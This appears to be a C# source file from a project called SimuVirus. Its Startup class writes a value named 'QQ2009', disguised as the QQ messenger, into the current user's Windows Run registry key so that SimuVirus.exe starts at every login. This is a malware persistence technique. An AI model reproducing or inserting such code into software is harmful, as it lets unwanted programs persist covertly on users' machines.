using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Windows;

namespace SimuVirus.deploy
{
    class Startup
    {
        private static RegistryKey startupKey;

        public void init_startup()
        {

            startupKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            string MyName = "QQ2009";
            string MyValue = Info.currentDirectory + @"\SimuVirus.exe";
            CreateStartup(MyName, MyValue);
        }

        private void CreateStartup(string KeyName, string KeyValue)
        {
            startupKey.SetValue(KeyName, KeyValue);
        }
    }
}
